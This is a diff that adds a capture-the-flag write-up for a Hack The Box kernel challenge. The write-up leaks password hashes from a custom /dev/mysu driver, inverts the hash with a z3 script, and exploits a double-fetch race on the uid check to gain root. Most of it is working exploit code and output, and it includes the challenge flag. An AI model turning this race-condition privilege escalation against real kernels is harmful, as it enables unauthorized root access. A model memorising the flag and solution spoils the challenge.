@@ -329,6 +329,7 @@ LABEL_8:
 ```
 
 > `Note`: The shown pseudocode is what I already did reverse (the structure...)
+{: .prompt-tip }
 
 Before I dig into what the `dev_write` handler does, I'll explain the structures which I created.
 
@@ -369,7 +370,7 @@ Back to the write handler, the overall authentication flow works as follows:
 - If a match is found, it proceeds to compute a hash of the provided password and compares it against the stored hash for that user.
 - When the comparison succeeds, it constructs a credential structure for the target user and updates the current process credentials accordingly, effectively switching privileges.
 
-In essence, the module behaves like a simplified kernel-level *su*, where access to a user account requires both a valid UID and the correct plaintext password.
+In essence, the module behaves like a simplified kernel-level *su*, where to access a user account requires both a valid UID and the correct plaintext password.
 
 > But what is the password hash?
 {: .prompt-tip }
@@ -385,5 +386,299 @@ From this, we can see that the password hash fields are currently initialized to
 
 This also matches the hint from *notes.txt*.
 
-On the remote however, it doesn't persist so the hash is there, but because we can leak it using `dev_read` this means we can recover the hash.
+On the remote however, it doesn't persist so the hash is there, because we can leak it using `dev_read` this means we can recover the hash.
 
+### Exploitation
+
+We now have a way to actually get the password hash but how do we get the plaintext password itself?
+
+Looking at the *hash* function we get this:
+
+```c
+__int64 __fastcall hash(const char *password)
+{
+  unsigned int magic_hash; // [rsp+Ch] [rbp-14h]
+  unsigned int v3; // [rsp+Ch] [rbp-14h]
+  __int64 count; // [rsp+10h] [rbp-10h]
+  size_t size; // [rsp+18h] [rbp-8h]
+
+  count = 0LL;
+  magic_hash = 0;
+  size = strlen(password);
+  while ( count != size )
+  {
+    v3 = 0x401 * (password[count] + magic_hash);
+    magic_hash = password[count++] ^ (v3 >> 6) ^ v3;
+  }
+  return magic_hash;
+}
+```
+
+It doesn't explicitly define the password length, but we can leverage [z3](https://github.com/Z3Prover/z3), an SMT solver, to compute a valid input that satisfies the hash function for a given output.
+
+However, even if we successfully recover a valid password, that only grants access to the corresponding user account and not root (the only user ids in the structure is that of user & admin).
+
+Since the ultimate objective is privilege escalation, how do we achieve this?
+
+There is, however, a vulnerability in the *dev_write* handler, a **double-fetch race condition** on the *uid* value.
+
+The issue appears during the UID validation and subsequent credential update:
+
+```c
+if (buf->uid != users.users[0].uid) {
+    // ...
+}
+
+uid = buf->uid;
+```
+
+Here, the kernel first reads *buf->uid* from user space to validate it against a known value in users. 
+
+Later, just before updating the process credentials, it reads *buf->uid* again from user space.
+
+This creates a **time-of-check to time-of-use (TOCTOU)** scenario, the value is trusted during validation, but re-fetched later without consistency guarantees.
+
+Because the value is fetched directly from user space twice, we can exploit this window by using a concurrent thread to modify *buf->uid* between the check and the assignment (we do this in a while loop). If we switch the UID to *0* (root) during that race window, the kernel will end up applying root credentials to the process.
+
+First we need to read the hash, here's the code I wrote for that:
+
+```c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+
+#define CHAR_DEVICE "/dev/mysu"
+
+typedef struct cred_t {
+    int uid;
+    int hash;
+} cred_t;
+
+
+int main() {
+    int fd = open(CHAR_DEVICE, O_RDWR);
+    if (fd < 0) {
+        perror("Failed to open device");
+        return -1;
+    }
+
+    cred_t creds[2] = {0};
+
+    if (read(fd, &creds, sizeof(creds)) < 0) {
+        perror("Failed to read from device");
+        close(fd);
+        return -1;
+    }
+
+    printf("UID: %d, Hash: %d\n", creds[0].uid, creds[0].hash);
+    printf("UID: %d, Hash: %d\n", creds[1].uid, creds[1].hash);
+
+    close(fd);
+
+    return 1;
+}
+```
+
+I compiled with `musl-gcc`.
+
+```bash
+mark@rwx:~/Desktop/Labs/HTB/Challenges/KernelAdventure1/release$ musl-gcc exp.c -o exp -static
+```
+
+To transfer the exploit, I made a python wrapper that encodes the exploit and sends it to the remote instance.
+
+```python
+from pwn import *
+import base64
+
+host, port = "154.57.164.80", 32661
+
+io = remote(host, port)
+
+def run(cmd):
+    io.sendlineafter(b"$", cmd)
+
+with open("./exp", "rb") as f:
+    payload = base64.b64encode(f.read()).decode()
+
+run(b"cd /tmp")
+run(b"> b64exp")
+
+for i in range(0, len(payload), 512):
+    info("Uploading... %#x", i)
+    chunk = payload[i:i+512]
+    run(f"echo '{chunk}' >> b64exp".encode())
+
+run(b"base64 -d b64exp > exp")
+run(b"chmod +x exp")
+
+io.interactive()
+```
+
+Running it we get the hash for both accounts.
+
+```bash
+/tmp $ $ ./exp
+./exp
+UID: 1000, Hash: 53583733
+UID: 1001, Hash: 716661863
+/tmp $ $ 
+```
+
+The first password hash has lower bits so I decided to recover the password for the account (uid == 1000).
+
+```bash
+mark@rwx:~/Desktop/Labs/HTB/Challenges/KernelAdventure1/release$ python3
+Python 3.12.3 (main, Mar 23 2026, 19:04:32) [GCC 13.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hex(53583733)
+'0x3319f75'
+>>> hex(716661863)
+'0x2ab76467'
+>>> (37296).bit_count()
+6
+>>> (716661863).bit_count()
+17
+>>>
+```
+
+Here's my z3 script:
+
+```python
+from z3 import *
+
+password = [BitVec(f"x_{i}", 8) for i in range(8)]
+result = BitVecVal(0, 32)
+expected = 0x3319f75
+
+s = Solver()
+
+for i in range(len(password)):
+    computed = 0x401 * (result + SignExt(24, password[i]))
+    result = computed ^ LShR(computed, 6) ^ SignExt(24, password[i])
+
+s.add(result == expected)
+
+if s.check() == sat:
+    m = s.model()
+    d = bytes(m[x].as_long() for x in password)
+    for i in d:
+        print(hex(i), end=',')
+    print()
+else:
+    print("No solution found")
+```
+
+Running it we get the password:
+
+```bash
+mark@rwx:~/Desktop/Labs/HTB/Challenges/KernelAdventure1/release$ python3 hashgg.py 
+0xb1,0xe5,0x97,0x4f,0x9e,0xa4,0xf7,0x5a,
+mark@rwx:~/Desktop/Labs/HTB/Challenges/KernelAdventure1/release$
+```
+
+With this set, we can now go ahead and exploit the double fetch.
+
+Here's my exploit:
+
+```c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+
+#define CHAR_DEVICE "/dev/mysu"
+
+
+char creds[] = {
+  0xe8, 0x03, 0x00, 0x00,
+  0xb1, 0xe5, 0x97, 0x4f,
+  0x9e, 0xa4, 0xf7, 0x5a,
+};
+
+int finished = 0;
+
+void *change_to_root(void *arg) {
+    int fd;
+
+    while (!finished) {
+        creds[0] = 0x0;
+        creds[1] = 0x0;
+
+        fd = open(CHAR_DEVICE, O_RDWR);
+        write(fd, creds, sizeof(creds));
+        close(fd);
+
+        if (getuid() == 0) {
+            finished = 1;
+            puts("[*] got root!");
+            system("/bin/sh");
+        }
+    }
+}
+
+void *change_to_user(void *arg) {
+    int fd;
+
+    while (!finished) {
+        creds[0] = 0xe8;
+        creds[1] = 0x03; 
+
+        fd = open(CHAR_DEVICE, O_RDWR);
+        write(fd, creds, sizeof(creds));
+        close(fd);
+
+        if (getuid() == 0) {
+            finished = 1;
+            puts("[*] got root!");
+            system("/bin/sh");
+        }
+    }
+}
+
+int main() {
+
+    int fd = open(CHAR_DEVICE, O_RDWR);
+    if (fd < 0) {
+        perror("Failed to open the device");
+        return -1;
+    }
+    
+    pthread_t thread1, thread2;
+
+    puts("[*] Worker threads starting...");
+
+    if (pthread_create(&thread1, NULL, change_to_root, NULL)) {
+        fprintf(stderr, "Error creating thread\n");
+        return -1;
+    }
+
+    if (pthread_create(&thread2, NULL, change_to_user, NULL)) {
+        fprintf(stderr, "Error creating thread\n");
+        return -1;
+    }
+
+    pthread_join(thread1, NULL);
+    pthread_join(thread2, NULL);
+
+    return 0;
+}
+```
+
+Running it works
+
+![pwned](pwned.png)
+
+#### FLAG
+
+```
+HTB{C0ngr4ts_y0u_3xpl0it3d_A_D0uBlE-FeTcH}
+```
